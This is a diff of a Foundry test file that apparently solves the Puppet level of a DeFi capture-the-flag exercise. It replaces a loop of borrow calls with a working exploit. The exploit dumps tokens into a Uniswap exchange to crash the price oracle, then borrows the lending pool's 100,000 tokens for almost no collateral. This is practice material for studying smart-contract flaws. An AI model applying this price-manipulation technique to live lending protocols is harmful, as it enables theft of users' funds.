@@ -3,7 +3,6 @@ pragma solidity >=0.8.0;
 
 import "forge-std/Test.sol";
 import "../../src/puppet/PuppetLevel.sol";
-import "@openzeppelin/contracts//token/ERC20/IERC20.sol";
 
 interface IPuppetPool {
   function borrow(uint256, address) external payable;
@@ -19,19 +18,15 @@ contract PuppetTest is Test {
 
   function testExploit() public {
     IPuppetPool lendingPool = IPuppetPool(address(level.lendingPool()));
+    DamnValuableToken token = DamnValuableToken(address(level.token()));
+    IUniswapExchange uniswapExchange = IUniswapExchange(address(level.uniswapExchange()));
 
-    IERC20 token = IERC20(address(level.token()));
-    token.transfer(address(level.uniswapExchange()), 1_000e18);
+    token.approve(address(uniswapExchange), 1000e18);
+    uniswapExchange.tokenToEthSwapInput(1000e18, 1, block.timestamp * 2);
 
-    uint256 step = 10e18;
-
-    for (uint8 i = 0; i < 1000; i++) {
-      console.log(lendingPool.calculateDepositRequired(step));
-
-      lendingPool.borrow
-        {value: lendingPool.calculateDepositRequired(step)}
-          (step, address(this));
-    }
+    lendingPool.borrow
+      {value: lendingPool.calculateDepositRequired(100_000e18)}
+        (100_000e18, address(this));
 
     level.validate();
   }
